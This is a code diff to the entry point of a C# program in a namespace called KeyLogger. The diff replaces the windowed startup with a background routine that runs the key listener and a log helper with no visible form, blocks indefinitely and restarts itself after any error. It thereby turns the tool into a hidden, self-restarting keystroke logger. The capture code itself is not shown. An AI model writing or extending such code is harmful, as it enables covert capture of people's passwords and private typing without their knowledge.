@@ -12,29 +12,42 @@ namespace KeyLogger
         [STAThread]
         static void Main()
         {
-            StartProgram();
+            BackgroundListen();
         }
 
-        static void StartProgram()
+        static void ForegroundListen()
+        {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            FormHome homeForm = null;
+
+            using (var listener = new KeyListener())
+            {
+                homeForm = new FormHome(listener);
+                Application.Run(homeForm);
+            }
+        }
+
+        static void BackgroundListen()
         {
             bool errorOccurred;
             do
             {
                 errorOccurred = false;
 
-                using (var listener = new KeyListener())
+                try
                 {
-                    try
+                    using (var listener = new KeyListener())
+                    using (var helper = new LogListenerHelper(listener))
                     {
-                        Application.EnableVisualStyles();
-                        Application.SetCompatibleTextRenderingDefault(false);
-                        Application.Run(new FormHome(listener));
+                        // Keep application running indefinitely
+                        new ManualResetEventSlim().Wait();
                     }
-                    catch
-                    {
-                        Thread.Sleep(500);
-                        errorOccurred = true;
-                    }
+                }
+                catch
+                {
+                    Thread.Sleep(500);
+                    errorOccurred = true;
                 }
             } while (errorOccurred);
         }
